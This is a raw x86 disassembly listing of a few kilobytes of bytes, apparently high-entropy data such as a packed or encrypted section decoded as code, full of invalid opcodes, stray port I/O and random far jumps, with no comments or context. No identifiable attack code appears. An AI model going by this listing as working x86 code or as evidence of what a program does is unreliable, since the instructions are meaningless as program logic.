  41d864:	test   ecx,0x2a7fa8a5
  41d86a:	js     0x41d8cd
  41d86c:	push   ebp
  41d86d:	push   edi
  41d86e:	push   ecx
  41d86f:	out    0x6d,eax
  41d871:	inc    eax
  41d872:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d873:	sti    
  41d874:	loopne 0x41d87f
  41d876:	(bad)  
  41d877:	mov    eax,ds:0xc26788e8
  41d87c:	dec    esi
  41d87d:	mov    bh,0x51
  41d87f:	mov    dl,0xff
  41d881:	shl    BYTE PTR [ebx+0x5e],cl
  41d884:	sub    eax,0xb2f150b1
  41d889:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d88a:	int3   
  41d88b:	mov    ecx,DWORD PTR [ecx+0x1380ebd9]
  41d891:	fnsetpm(287 only) 
  41d893:	jb     0x41d85e
  41d895:	pop    eax
  41d896:	lods   al,BYTE PTR ds:[esi]
  41d897:	ins    BYTE PTR es:[edi],dx
  41d898:	xchg   esi,eax
  41d899:	push   ecx
  41d89a:	ins    DWORD PTR es:[edi],dx
  41d89b:	xchg   ebp,eax
  41d89c:	lods   eax,DWORD PTR ds:[esi]
  41d89d:	je     0x41d83d
  41d89f:	jmp    0xc266:0xf8aa
  41d8a5:	or     eax,0xa9455ab6
  41d8aa:	repnz mov WORD PTR [eax+0x5a],cs
  41d8ae:	mov    al,0x9c
  41d8b0:	shl    BYTE PTR [ebp-0x4da00a37],0xc
  41d8b7:	mov    ch,0x13
  41d8b9:	cmp    DWORD PTR [ebp-0x30],ebx
  41d8bc:	xor    BYTE PTR [ebx-0x7af0347],ah
  41d8c2:	and    bl,BYTE PTR [edi+eiz*2]
  41d8c5:	sub    al,0x3d
  41d8c7:	repz jge 0x41d870
  41d8ca:	jmp    0x8b808b85
  41d8cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d8d0:	push   ecx
  41d8d1:	jmp    0x59318b3c
  41d8d6:	(bad)
  41d8d9:	fsubr  QWORD PTR [edx]
  41d8db:	jmp    0x9a85038b
  41d8e0:	jecxz  0x41d86f
  41d8e2:	push   ebx
  41d8e3:	adc    eax,0xb1d55df
  41d8e8:	mov    ebx,0xf2570051
  41d8ed:	rol    BYTE PTR [eax+0x11],cl
  41d8f0:	cmp    eax,DWORD PTR [edx-0x4771c779]
  41d8f6:	xor    eax,0x5bfc9fd1
  41d8fb:	push   cs
  41d8fc:	retf   0xe8d5
  41d8ff:	fwait
  41d900:	scas   al,BYTE PTR es:[edi]
  41d901:	cld    
  41d902:	retf   
  41d903:	push   esi
  41d904:	ret    0x80d9
  41d907:	push   ebp
  41d908:	mov    bl,0xd1
  41d90a:	cmp    DWORD PTR [esi-0xcf825b],esi
  41d910:	arpl   WORD PTR [eax],cx
  41d912:	(bad)  
  41d913:	aam    0x48
  41d915:	pop    eax
  41d916:	dec    ebp
  41d917:	in     eax,dx
  41d918:	mov    gs,WORD PTR [eax-0x5e]
  41d91b:	fstp   TBYTE PTR [ebp-0x38]
  41d91e:	mov    dl,0xc5
  41d920:	push   ecx
  41d921:	dec    ebx
  41d922:	cdq    
  41d923:	fwait
  41d924:	es sahf 
  41d926:	push   ebp
  41d927:	jmp    FWORD PTR [edx+0x34]
  41d92a:	xchg   esi,eax
  41d92b:	add    dh,BYTE PTR [ecx]
  41d92d:	addr16 cld 
  41d92f:	aaa    
  41d930:	je     0x41d8e1
  41d932:	jmp    0x41d983
  41d934:	xchg   edi,eax
  41d935:	xor    dh,BYTE PTR [esi]
  41d937:	jns    0x41d933
  41d939:	jmp    0xf06b705e
  41d93e:	std    
  41d93f:	or     BYTE PTR [ebp+0x79],ch
  41d942:	sbb    DWORD PTR [edi-0x45],eax
  41d945:	mov    bl,0x49
  41d947:	cmp    ch,BYTE PTR [edx]
  41d949:	jmp    0xfd58:0x84ce1d10
  41d950:	inc    edi
  41d951:	rcr    DWORD PTR [edx+0x62],0x4
  41d955:	mov    esp,0x2a249c74
  41d95a:	pop    esp
  41d95b:	mov    ch,0xf
  41d95d:	push   cs
  41d95e:	cmp    di,WORD PTR ds:0xdbee94f
  41d965:	hlt    
  41d966:	or     eax,0x3eb16ef4
  41d96b:	pop    eax
  41d96c:	fcomi  st,st(0)
  41d96e:	fcomp  DWORD PTR [edx]
  41d970:	iret   
  41d971:	mov    ch,BYTE PTR [eax+0x3c47ab1]
  41d977:	sbb    DWORD PTR [esi-0x5784c836],ecx
  41d97d:	out    dx,eax
  41d97e:	xchg   ecx,eax
  41d97f:	push   cs
  41d980:	cmp    DWORD PTR ds:0xfa4860a7,ebx
  41d986:	jae    0x41d9d5
  41d988:	sar    BYTE PTR [esi+eiz*1],1
  41d98b:	dec    ebx
  41d98c:	push   ebp
  41d98d:	mov    gs,esp
  41d98f:	arpl   si,bp
  41d991:	mov    bl,0xb5
  41d993:	(bad)  
  41d994:	outs   dx,DWORD PTR ds:[esi]
  41d995:	scas   eax,DWORD PTR es:[edi]
  41d996:	push   es
  41d997:	loop   0x41d9cb
  41d999:	jbe    0x41da03
  41d99b:	xor    BYTE PTR [edx+eiz*1+0x540b19d2],bh
  41d9a2:	cwde   
  41d9a3:	stos   BYTE PTR es:[edi],al
  41d9a4:	das    
  41d9a5:	test   eax,0x598943f9
  41d9aa:	out    dx,al
  41d9ab:	adc    edi,DWORD PTR [ebx-0x12]
  41d9ae:	shr    BYTE PTR [esi+0x6cb085de],0x40
  41d9b5:	pop    esp
  41d9b6:	push   esi
  41d9b7:	mov    dh,0x51
  41d9b9:	retf   0x771f
  41d9bc:	out    0x59,al
  41d9be:	push   edx
  41d9bf:	cld    
  41d9c0:	cdq    
  41d9c1:	rcl    DWORD PTR [ebx+eax*2-0xd],cl
  41d9c5:	inc    ebp
  41d9c6:	sbb    DWORD PTR [ecx],edi
  41d9c8:	add    eax,0x8686ec96
  41d9cd:	add    edi,DWORD PTR [esi]
  41d9cf:	fwait
  41d9d0:	in     eax,0xc7
  41d9d2:	pop    es
  41d9d3:	adc    al,0x4f
  41d9d5:	and    al,0xe5
  41d9d7:	mov    ch,0xd1
  41d9d9:	push   ss
  41d9da:	sbb    esi,ebp
  41d9dc:	sahf   
  41d9dd:	ins    DWORD PTR es:[edi],dx
  41d9de:	xchg   edx,esi
  41d9e0:	mov    al,0x7a
  41d9e2:	enter  0xc236,0xd
  41d9e6:	dec    edx
  41d9e7:	push   eax
  41d9e8:	mov    ?,WORD PTR [ecx]
  41d9ea:	into   
  41d9eb:	dec    edx
  41d9ec:	(bad)  
  41d9ed:	rcl    BYTE PTR [edi],cl
  41d9ef:	aas    
  41d9f0:	sar    BYTE PTR [esi+0x7cddb84e],0xf2
  41d9f7:	mov    ebx,0xa226b23f
  41d9fc:	call   0x381a0c8b
  41da01:	ficomp DWORD PTR [edx-0x5c]
  41da04:	mov    ds:0xab8b1176,al
  41da09:	pop    ds
  41da0a:	in     eax,dx
  41da0b:	gs sbb al,0x23
  41da0e:	and    al,0x83
  41da10:	call   0x5192:0xa8a2fe32
  41da17:	pop    es
  41da18:	pushf  
  41da19:	push   edi
  41da1a:	mov    ch,0xa5
  41da1c:	addr16 call 0x50457c41
  41da22:	hlt    
  41da23:	leave  
  41da24:	popf   
  41da25:	jmp    0xfa0:0xdea62fc6
  41da2c:	scas   al,BYTE PTR es:[edi]
  41da2d:	adc    al,0x57
  41da2f:	xlat   BYTE PTR ds:[ebx]
  41da30:	hlt    
  41da31:	mov    edi,0xa250315f
  41da36:	push   esp
  41da37:	popf   
  41da38:	add    esp,esi
  41da3a:	in     al,dx
  41da3b:	mov    bh,0x37
  41da3d:	add    eax,0xc107584c
  41da42:	adc    BYTE PTR [ecx-0x4153872d],0x38
  41da49:	icebp  
  41da4a:	ins    DWORD PTR es:[edi],dx
  41da4b:	dec    edx
  41da4c:	out    0x91,eax
  41da4e:	out    dx,eax
  41da4f:	mov    ?,WORD PTR [edx+0x24]
  41da52:	pop    ebp
  41da53:	aad    0x90
  41da55:	test   BYTE PTR [edi+0xbf86420],dh
  41da5b:	cmp    DWORD PTR [edi+0xc],esp
  41da5e:	pop    esi
  41da5f:	ret    
  41da60:	or     ebx,esi
  41da62:	sti    
  41da63:	fcomp  st(0)
  41da65:	shl    DWORD PTR [ebx+0x6b63fea],0x80
  41da6c:	sti    
  41da6d:	mov    dh,0xe9
  41da6f:	pop    ds
  41da70:	sub    BYTE PTR [eax+0x7a6e731c],dh
  41da76:	mov    al,ds:0x3a9de698
  41da7b:	jle    0x41dabf
  41da7d:	enter  0x27a4,0xfd
  41da81:	push   ss
  41da82:	add    ah,bl
  41da84:	mov    ebx,0xab5ae755
  41da89:	adc    eax,0x72e63245
  41da8e:	or     DWORD PTR [ebp+0x458e284c],0x4f
  41da95:	pop    edi
  41da96:	mov    ?,WORD PTR [eax+0x5f]
  41da99:	mov    eax,0x59beb396
  41da9e:	pop    ss
  41da9f:	test   al,0x65
  41daa1:	int    0xcf
  41daa3:	cmp    eax,0xd3683999
  41daa8:	leave  
  41daa9:	inc    esi
  41daaa:	sbb    al,0x3d
  41daac:	outs   dx,DWORD PTR ds:[esi]
  41daad:	inc    edx
  41daae:	scas   eax,DWORD PTR es:[edi]
  41daaf:	jg     0x41db1b
  41dab1:	mov    ebx,0x374f17cc
  41dab6:	test   eax,0xd4053062
  41dabb:	fisubr DWORD PTR [edx-0x41]
  41dabe:	mov    esp,0x11453dc1
  41dac3:	mov    BYTE PTR [ebx+0xb463049],cl
  41dac9:	je     0x41daf2
  41dacb:	icebp  
  41dacc:	adc    DWORD PTR [di+0x60],ecx
  41dad0:	iret   
  41dad1:	out    0x6,eax
  41dad3:	mov    ch,0xaf
  41dad5:	les    ebp,FWORD PTR ss:[esi+esi*1+0x3867b4f9]
  41dadd:	sub    esi,DWORD PTR [eax]
  41dadf:	sub    esp,DWORD PTR [esi]
  41dae1:	loope  0x41dad9
  41dae3:	pop    es
  41dae4:	ds int3 
  41dae6:	push   edx
  41dae7:	cmp    bl,BYTE PTR [edi+0x32]
  41daea:	lahf   
  41daeb:	pusha  
  41daec:	test   bl,bh
  41daee:	test   BYTE PTR [ebp+0x65],ch
  41daf1:	jno    0x41db32
  41daf3:	stos   BYTE PTR es:[edi],al
  41daf4:	and    BYTE PTR [edi-0x6bcc483a],0x57
  41dafb:	(bad)  
  41dafc:	sahf   
  41dafd:	mov    ch,0x4
  41daff:	cwde   
  41db00:	mov    BYTE PTR [edx],cl
  41db02:	sbb    BYTE PTR [edi+0x7b],ch
  41db05:	dec    eax
  41db06:	xchg   ebp,eax
  41db07:	sub    eax,ecx
  41db09:	adc    ch,BYTE PTR cs:[edx+0x40]
  41db0d:	sbb    BYTE PTR [esi+eax*8],cl
  41db10:	inc    eax
  41db11:	out    0x87,al
  41db13:	(bad)  
  41db14:	cmp    DWORD PTR [edx+0x5ad83e50],edi
  41db1a:	les    ebp,FWORD PTR [ecx-0x6b]
  41db1d:	xchg   esp,esi
  41db1f:	jg     0x41db29
  41db21:	push   0x1a
  41db23:	in     eax,0x87
  41db25:	fadd   QWORD PTR ds:0x9264bca0
  41db2b:	hlt    
  41db2c:	gs jmp 0xae461aa3
  41db32:	adc    BYTE PTR [ecx-0x4c],cl
  41db35:	sar    BYTE PTR [edx-0x16],0xba
  41db39:	sbb    eax,0x416e9751
  41db3e:	out    dx,eax
  41db3f:	and    bh,BYTE PTR [eax]
  41db41:	arpl   WORD PTR [ecx+eax*1+0x4f],dx
  41db45:	repnz cwde 
  41db47:	out    dx,eax
  41db48:	std    
  41db49:	inc    edx
  41db4a:	gs das 
  41db4c:	cli    
  41db4d:	in     eax,0xa
  41db4f:	gs xchg ebx,eax
  41db51:	dec    edx
  41db52:	jmp    0x41db55
  41db54:	les    edi,FWORD PTR [ecx]
  41db56:	mov    ah,0x86
  41db58:	push   ebp
  41db59:	mov    esp,0xee131f34
  41db5e:	push   edx
  41db5f:	lea    esp,[edi+0x2e]
  41db62:	push   ss
  41db63:	or     eax,0xf1f6828d
  41db68:	mov    ah,0x71
  41db6a:	xchg   edx,eax
  41db6b:	ds sbb al,0x1c
  41db6e:	sbb    eax,DWORD PTR [edx]
  41db70:	jnp    0x41db3f
  41db72:	in     al,dx
  41db73:	jae    0x41dbf2
  41db75:	pop    ebp
  41db76:	pop    ecx
  41db77:	mov    ah,0x75
  41db79:	push   edi
  41db7a:	(bad)  
  41db7c:	mov    ecx,0x5ee6d10d
  41db81:	pop    ss
  41db82:	dec    eax
  41db83:	lea    ecx,[edi]
  41db85:	imul   edi,DWORD PTR [ebx-0x5e3a95a3],0x41361c61
  41db8f:	mov    al,0x1
  41db91:	(bad)  
  41db92:	pop    esp
  41db93:	jecxz  0x41dbf8
  41db95:	rol    BYTE PTR [ebx+0x42855066],cl
  41db9b:	cwde   
  41db9c:	mov    esp,0x58573d0e
  41dba1:	jmp    0xf2c48b2d
  41dba6:	push   ecx
  41dba7:	ret    0xc809
  41dbaa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dbab:	cwde   
  41dbac:	add    BYTE PTR [edx-0x64a69516],bh
  41dbb2:	mov    dh,0xf5
  41dbb4:	dec    edx
  41dbb5:	cmp    dl,BYTE PTR [esp+edx*8-0x6d7bef63]
  41dbbc:	(bad)  
  41dbbd:	dec    ebx
  41dbbe:	mov    dl,0xf7
  41dbc0:	lea    esp,[ebx+0x5a1d3055]
  41dbc6:	sbb    eax,0xf81d316f
  41dbcb:	into   
  41dbcc:	cdq    
  41dbcd:	push   edi
  41dbce:	add    ch,al
  41dbd0:	dec    eax
  41dbd1:	mov    ebx,0x2d4a1a44
  41dbd6:	sub    eax,DWORD PTR [ebx-0x58766a0]
  41dbdc:	loop   0x41db96
  41dbde:	mov    eax,ds:0xe0a9ff74
  41dbe3:	adc    al,0xc6
  41dbe5:	mov    bl,0xf1
  41dbe7:	jl     0x41dc38
  41dbe9:	xor    bl,ch
  41dbeb:	fs ins BYTE PTR es:[edi],dx
  41dbed:	jne    0x41dbcc
  41dbef:	addr16 iret 
  41dbf1:	pop    ebx
  41dbf2:	xchg   edi,esp
  41dbf4:	adc    eax,0x95976eaf
  41dbf9:	fmul   DWORD PTR [esi-0x28cb82cd]
  41dbff:	mov    ebp,0xa2fc8908
  41dc04:	push   eax
  41dc05:	dec    esp
  41dc06:	mov    al,ds:0x49986ab5
  41dc0b:	and    eax,0xee840e53
  41dc10:	add    eax,0x49cdad2
  41dc15:	mov    bl,0xdc
  41dc17:	push   0x3cea79ce
  41dc1c:	aas    
  41dc1d:	lea    esi,[edi+0x4c]
  41dc20:	push   ebx
  41dc21:	rcl    cl,1
  41dc23:	(bad)  
  41dc24:	popa   
  41dc25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dc26:	pop    esp
  41dc27:	(bad)  
  41dc28:	adc    dl,BYTE PTR [ebx+0x1cb26198]
  41dc2e:	test   ebx,ebx
  41dc30:	mov    eax,ds:0x10142d08
  41dc35:	mov    edi,0xd1f26a91
  41dc3a:	mov    ch,BYTE PTR [esp+eiz*8+0x1911340f]
  41dc41:	mov    bl,0xac
  41dc43:	dec    esi
  41dc44:	cmp    DWORD PTR [esi],eax
  41dc46:	jge    0x41dc70
  41dc48:	(bad)  
  41dc49:	sub    DWORD PTR [ebp-0x5db2af19],ebp
  41dc4f:	add    DWORD PTR ds:[eax-0x64bfa012],esp
  41dc56:	ins    DWORD PTR es:[edi],dx
  41dc57:	out    0xc3,al
  41dc59:	adc    si,WORD PTR [esi-0x20a4d74c]
  41dc60:	mov    ebx,0xdfb9daa2
  41dc65:	ds inc edx
  41dc67:	pop    ecx
  41dc68:	mov    WORD PTR [ebx],?
  41dc6a:	xchg   esi,eax
  41dc6b:	clc    
  41dc6c:	stos   DWORD PTR es:[edi],eax
  41dc6d:	(bad)  
  41dc6e:	repnz pop edi
  41dc70:	xor    DWORD PTR [edx],edx
  41dc72:	cmp    BYTE PTR ds:0x65734f39,ch
  41dc78:	cli    
  41dc79:	mov    ebp,0x9ae6baa9
  41dc7e:	or     edx,DWORD PTR [ebx]
  41dc80:	into   
  41dc81:	mov    esi,0xe5d535f
  41dc86:	gs push ss
  41dc88:	dec    edi
  41dc89:	add    ebx,edx
  41dc8b:	hlt    
  41dc8c:	or     edi,DWORD PTR [edi]
  41dc8e:	int3   
  41dc8f:	not    BYTE PTR [ebx]
  41dc91:	cdq    
  41dc92:	lods   eax,DWORD PTR ds:[esi]
  41dc93:	xchg   edx,eax
  41dc94:	xor    ah,BYTE PTR [eax+0x5c]
  41dc97:	xchg   esp,eax
  41dc98:	(bad)
  41dc9b:	mov    ?,WORD PTR [ebx]
  41dc9d:	ja     0x41dd05
  41dc9f:	mov    dh,0x8a
  41dca1:	mov    ebx,0x4e7b479d
  41dca6:	nop
  41dca7:	jle    0x41dc52
  41dca9:	jb     0x41dc7b
  41dcab:	(bad)  [edx-0xd]
  41dcae:	pop    es
  41dcaf:	je     0x41dc9d
  41dcb1:	pop    esp
  41dcb2:	xor    eax,0xc2bc4717
  41dcb7:	ins    BYTE PTR es:[edi],dx
  41dcb8:	pop    edi
  41dcb9:	fld    QWORD PTR [ecx-0xa]
  41dcbc:	pop    ss
  41dcbd:	mov    edx,0x7d326ca4
  41dcc2:	shl    eax,cl
  41dcc4:	(bad)  [ecx]
  41dcc6:	xor    eax,0xb6c1c1d0
  41dccb:	jl     0x41dcd6
  41dccd:	aad    0x94
  41dccf:	imul   BYTE PTR [edx+0x4420bdc5]
  41dcd5:	pop    esi
  41dcd6:	jno    0x41dc6c
  41dcd8:	mov    esi,0x4d8d8fd2
  41dcdd:	cwde   
  41dcde:	lahf   
  41dcdf:	jo     0x41dd09
  41dce1:	les    ebp,FWORD PTR [ebx]
  41dce3:	xchg   esp,eax
  41dce4:	push   0x66
  41dce6:	lods   al,BYTE PTR ds:[esi]
  41dce7:	scas   eax,DWORD PTR es:[edi]
  41dce8:	pop    ecx
  41dce9:	ins    BYTE PTR es:[edi],dx
  41dcea:	into   
  41dceb:	pushf  
  41dcec:	and    eax,0xc75a6b0c
  41dcf1:	ins    DWORD PTR es:[edi],dx
  41dcf2:	ror    DWORD PTR [esp+edx*2],1
  41dcf5:	cli    
  41dcf6:	xchg   ebx,eax
  41dcf7:	mov    edx,cs
  41dcf9:	lahf   
  41dcfa:	push   0xffffffef
  41dcfc:	pop    ebx
  41dcfd:	inc    ecx
  41dcfe:	call   0x379e:0x832edf4d
  41dd05:	stc    
  41dd06:	cs out 0x55,eax
  41dd09:	or     esp,DWORD PTR ds:0x74ccc9a6
  41dd0f:	sub    eax,0xb4320dbc
  41dd14:	mov    al,0xc1
  41dd16:	xor    eax,0x11730779
  41dd1b:	inc    eax
  41dd1c:	sub    BYTE PTR [edx-0x2c],ch
  41dd1f:	call   0x3d47:0x1460714d
  41dd26:	jne    0x41dd78
  41dd28:	sbb    DWORD PTR [eax+0x76],edx
  41dd2b:	pop    ds
  41dd2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dd2d:	push   ebp
  41dd2e:	sub    DWORD PTR [ebp-0x6bc61836],0x69c264d
  41dd38:	icebp  
  41dd39:	ins    BYTE PTR es:[edi],dx
  41dd3a:	mov    gs,WORD PTR [ecx+0x50655db6]
  41dd40:	data16 js 0x41dcf2
  41dd43:	fsubr  DWORD PTR [eax+esi*4]
  41dd46:	aaa    
  41dd47:	xor    DWORD PTR [ecx+0x2a],eax
  41dd4a:	(bad)  
  41dd4b:	and    DWORD PTR [edi+eiz*2+0x6ee8c93c],ebp
  41dd52:	jmp    0xbef5:0xdd15fddb
  41dd59:	push   ss
  41dd5a:	jle    0x41dd93
  41dd5c:	outs   dx,BYTE PTR ds:[esi]
  41dd5d:	pop    edi
  41dd5e:	and    eax,0x99717d50
  41dd63:	test   BYTE PTR [ebp+0x4b],cl
  41dd66:	sub    edx,DWORD PTR [edi+eiz*1+0x29]
  41dd6a:	retf   
  41dd6b:	mov    cs,WORD PTR [edx]
  41dd6d:	gs popa 
  41dd6f:	shr    esi,cl
  41dd71:	retf   0x824f
  41dd74:	hlt    
  41dd75:	and    al,0x56
  41dd77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dd78:	push   es
  41dd79:	fcomp  QWORD PTR [esi-0x18]
  41dd7c:	in     al,dx
  41dd7d:	js     0x41ddba
  41dd7f:	jmp    FWORD PTR [ebx]
  41dd81:	sub    BYTE PTR [edx+edx*2],dh
  41dd84:	adc    al,0x22
  41dd86:	sub    ecx,DWORD PTR [eax]
  41dd88:	jbe    0x41dd99
  41dd8a:	mov    eax,0x399b8561
  41dd8f:	iret   
  41dd90:	(bad)  
  41dd91:	xor    ah,BYTE PTR [edx+0x73c7073d]
  41dd97:	test   eax,0x9e904844
  41dd9c:	and    edx,DWORD PTR [eax-0x35a9f459]
  41dda2:	je     0x41dd74
  41dda4:	mov    al,ds:0xc15ba1fe
  41dda9:	dec    ebx
  41ddaa:	mov    al,ds:0x7d9f729c
  41ddaf:	add    BYTE PTR [esi+0x3a],0xb6
  41ddb3:	jnp    0x41ddb7
  41ddb5:	mov    ds:0xb158ddfc,eax
  41ddba:	mov    esp,0xbe7c66d5
  41ddbf:	out    0x4b,eax
  41ddc1:	lahf   
  41ddc2:	(bad)  
  41ddc4:	les    eax,FWORD PTR [esi]
  41ddc6:	in     al,dx
  41ddc7:	sub    al,0xee
  41ddc9:	or     eax,eax
  41ddcb:	inc    BYTE PTR [esi]
  41ddcd:	mov    edi,0x6604d68d
  41ddd2:	mov    dh,0xd5
  41ddd4:	xchg   ebp,eax
  41ddd5:	add    BYTE PTR [ecx+0x1d],al
  41ddd8:	push   0xdec40877
  41dddd:	shl    BYTE PTR [ecx+0x6bedeaab],cl
  41dde3:	adc    cl,BYTE PTR [ebx-0x7a]
  41dde6:	push   ebp
  41dde7:	pmulhuw mm1,mm7
  41ddea:	(bad)  
  41ddeb:	retf   0xbac1
  41ddee:	push   ss
  41ddef:	loop   0x41dd9a
  41ddf1:	outs   dx,BYTE PTR ds:[esi]
  41ddf2:	aaa    
  41ddf3:	fisttp WORD PTR [ebp+0x7c]
  41ddf6:	leave  
  41ddf7:	jge    0x41de51
  41ddf9:	fadd   DWORD PTR ds:0x527b62ee
  41ddff:	jno    0x41ddbb
  41de01:	std    
  41de02:	mov    esp,0xaa533f2
  41de07:	sub    al,0x9b
  41de09:	jae    0x41de61
  41de0b:	pop    edi
  41de0c:	cs xchg ecx,eax
  41de0e:	test   al,0xe2
  41de10:	pop    es
  41de11:	ret    0x3a0a
  41de14:	dec    ebp
  41de15:	ins    DWORD PTR es:[edi],dx
  41de16:	mov    ds:0x9c2e71fc,al
  41de1b:	mov    bh,0xf5
  41de1d:	dec    esp
  41de1e:	mov    esi,0x2ece0e0b
  41de23:	push   0xfffffff4
  41de25:	mov    al,ds:0xc17fc9aa
  41de2a:	xchg   BYTE PTR [ecx],ah
  41de2c:	sub    dl,BYTE PTR [esp+eiz*2+0x6c]
  41de30:	shl    BYTE PTR [edi+ebx*2-0x9],cl
  41de34:	jmp    0x41ddbe
  41de36:	mov    ebp,DWORD PTR [esi]
  41de38:	sbb    eax,0x63aba442
  41de3d:	pop    edi
  41de3e:	lds    edi,FWORD PTR [eax+0x3bb7f0c1]
  41de44:	dec    ecx
  41de45:	sub    BYTE PTR [edx+0x75],ah
  41de48:	cdq    
  41de49:	aad    0x33
  41de4b:	sahf   
  41de4c:	sahf   
  41de4d:	(bad)  
  41de4e:	push   eax
  41de4f:	mov    dh,BYTE PTR [edi-0x26]
  41de52:	int    0xb9
  41de54:	cmp    BYTE PTR [ecx],ch
  41de56:	lods   al,BYTE PTR ds:[esi]
  41de57:	mov    edi,0x16902b9
  41de5c:	in     eax,0x47
  41de5e:	cmp    BYTE PTR [edi-0x54bb08e1],0x2a
  41de65:	outs   dx,BYTE PTR ds:[esi]
  41de66:	push   es
  41de67:	mov    dl,0x80
  41de69:	in     al,dx
  41de6a:	in     al,0xcb
  41de6c:	xchg   edi,eax
  41de6d:	push   es
  41de6e:	imul   eax,esp,0x775dff
  41de74:	sti    
  41de75:	jno    0x41de6c
  41de77:	xor    ah,cl
  41de79:	call   0x113f53ce
  41de7e:	mov    BYTE PTR [ecx],bl
  41de80:	cmp    eax,DWORD PTR [esi-0x1494900b]
  41de86:	not    DWORD PTR [esi+0x77]
  41de89:	fstp   QWORD PTR [eax+0x4a46477f]
  41de8f:	adc    DWORD PTR [ecx+0x25c8302a],0xffffffa1
  41de96:	push   ds
  41de97:	shl    DWORD PTR [edi+0x569a16ac],cl
  41de9d:	je     0x41deda
  41de9f:	(bad)  
  41dea0:	jecxz  0x41de49
  41dea2:	cdq    
  41dea3:	jp     0x41de3f
  41dea5:	imul   ecx,DWORD PTR [ebx],0x1a4439c4
  41deab:	jnp    0x41deb8
  41dead:	imul   eax,DWORD PTR [esp+edi*4-0x4ac2f5c2],0x30
  41deb5:	nop
  41deb6:	sbb    DWORD PTR [ebp+0x6267d1dd],ecx
  41debc:	mov    cl,0x90
  41debe:	mov    bh,0xee
  41dec0:	das    
  41dec1:	pushf  
  41dec2:	jmp    0x41df31
  41dec4:	fwait
  41dec5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dec6:	pop    DWORD PTR [edx+0x57]
  41dec9:	mov    al,0xd2
  41decb:	adc    ch,BYTE PTR [esi+0x21]
  41dece:	mov    dl,BYTE PTR ds:0x8a412b42
  41ded4:	dec    edi
  41ded5:	inc    edi
  41ded6:	ret    0x97fa
  41ded9:	rcr    BYTE PTR [eax+ecx*1-0x6f89e31a],0xcc
  41dee1:	pop    es
  41dee2:	adc    DWORD PTR [esi],ebp
  41dee4:	mov    esi,0x4677a366
  41dee9:	repnz sub DWORD PTR [ebp-0x76],0x5
  41deee:	(bad)  
  41deef:	idiv   bh
  41def1:	mov    al,ds:0xdb148698
  41def6:	and    cl,BYTE PTR ds:0xc693c10e
  41defc:	cmp    al,0x3b
  41defe:	inc    esp
  41deff:	mov    bl,0xc1
  41df01:	jno    0x41df5b
  41df03:	stos   BYTE PTR es:[edi],al
  41df04:	out    0xc9,eax
  41df06:	mov    dh,0xb6
  41df08:	inc    ebp
  41df09:	sbb    cl,bh
  41df0b:	(bad)  
  41df0c:	out    0xab,eax
  41df0e:	rcl    DWORD PTR [esi],0xe7
  41df11:	jp     0x41dec9
  41df13:	inc    ebp
  41df14:	pop    edi
  41df15:	inc    esp
  41df16:	push   esi
  41df17:	jle    0x41df21
  41df19:	sbb    al,0x52
  41df1b:	jmp    0xf01b4a08
  41df20:	xor    ebp,0x3d
  41df23:	iret   
  41df24:	mov    eax,0x29fc31
  41df29:	ficom  WORD PTR ds:0x97f4cda7
  41df2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41df30:	dec    esp
  41df31:	rol    cl,1
  41df33:	frstor [ebp+0x1c12b7]
  41df39:	rcr    ecx,cl
  41df3b:	aas    
  41df3c:	adc    dl,bh
  41df3e:	cmc    
  41df3f:	mov    BYTE PTR [edi-0x5],dl
  41df42:	jae    0x41dfb7
  41df44:	fisttp WORD PTR [eax-0x40dc3184]
  41df4a:	inc    esp
  41df4b:	mov    esp,0xb9f7e5f8
  41df50:	cmp    al,0xb
  41df52:	outs   dx,DWORD PTR ds:[esi]
  41df53:	(bad)
  41df57:	cmp    al,0xad
  41df59:	nop
  41df5a:	jmp    0x41df44
  41df5c:	push   esp
  41df5d:	mov    esi,0xb52d3178
  41df62:	lds    ebp,FWORD PTR [edi]
  41df64:	aam    0x7a
  41df66:	scas   eax,DWORD PTR es:[edi]
  41df67:	mov    dl,0x3c
  41df69:	arpl   WORD PTR [edi-0x71],dx
  41df6c:	pop    edx
  41df6d:	popf   
  41df6e:	jb     0x41df67
  41df70:	inc    eax
  41df71:	push   eax
  41df72:	sub    bh,BYTE PTR [edx]
  41df74:	jmp    0x41dfe8
  41df76:	jbe    0x41df73
  41df78:	cmp    cl,ah
  41df7a:	retf   
  41df7b:	and    eax,0x8049e35d
  41df80:	xchg   edx,eax
  41df81:	(bad)  
  41df83:	dec    eax
  41df84:	ja     0x41dfc9
  41df86:	push   edx
  41df87:	pop    edx
  41df88:	iret   
  41df89:	rcr    ah,0x44
  41df8c:	or     ch,al
  41df8e:	fild   QWORD PTR [ebx]
  41df90:	test   bh,bh
  41df92:	sub    eax,0xb459efe0
  41df97:	or     BYTE PTR [edi],cl
  41df99:	and    eax,0x73a7f2e0
  41df9e:	iret   
  41df9f:	xchg   esi,eax
  41dfa0:	lods   eax,DWORD PTR ds:[esi]
  41dfa1:	mov    dl,0x94
  41dfa3:	dec    ebp
  41dfa4:	inc    ecx
  41dfa5:	fs mov al,0x6f
  41dfa8:	mov    BYTE PTR [ecx+ecx*8-0x30c8d95c],al
  41dfaf:	mov    ebx,0x9638b0d7
  41dfb4:	mov    WORD PTR [ebp-0x1d918886],es
  41dfba:	sub    edi,ebp
  41dfbc:	inc    ebp
  41dfbd:	inc    eax
  41dfbe:	xchg   ch,dh
  41dfc0:	sub    eax,0x6eb35ad2
  41dfc5:	shr    BYTE PTR [esi],0xca
  41dfc8:	pop    edi
  41dfc9:	in     al,0x85
  41dfcb:	xchg   ebx,eax
  41dfcc:	shl    BYTE PTR [eax-0x7b],1
  41dfcf:	fcomp  QWORD PTR [eax+0x22]
  41dfd2:	push   0x42ac52a1
  41dfd7:	ins    BYTE PTR es:[edi],dx
  41dfd8:	push   ebx
  41dfd9:	inc    esp
  41dfda:	jmp    0xc549:0x199eee91
  41dfe1:	std    
  41dfe2:	mov    edx,0x4ea0c5f6
  41dfe7:	fs xchg ecx,eax
  41dfe9:	jae    0x41e048
  41dfeb:	stc    
  41dfec:	retf   
  41dfed:	mov    edx,0xdd6ed27
